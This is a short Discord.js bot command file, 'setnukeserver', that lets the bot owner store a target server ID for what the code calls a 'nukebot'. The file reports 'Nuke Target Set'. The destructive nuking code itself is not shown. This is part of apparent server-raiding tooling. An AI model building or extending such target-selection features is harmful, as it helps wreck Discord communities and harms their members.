const {Client, Message, MessageEmbed} = require('discord.js')
const db = require('quick.db')

module.exports = {
    name: 'setnukeserver',
    UserPerms: ["SEND_MESSAGES"],
    ownerOnly: true,
    minArgs: 1,
    maxArgs: 1,
    syntax: 'v!setnukeserver [Server ID]',

    run: async (client, message, args) => {

        const serverId = args.join(" ")

        if(!serverId) {
            const embed = new MessageEmbed
            embed.setTitle(`Provide a Server ID`)
            embed.setColor('#2a2d2e')
            message.author.send({embeds:[embed]})
            return
        }

        const server = db.set(`ownerOnlyConfig.nukebot`, `${serverId}`)

        const embed = new MessageEmbed
        embed.setTitle(`Nuke Target Set`)
        embed.setColor(`#2a2d2e`)
        message.author.send({embeds:[embed]})

               

    }
}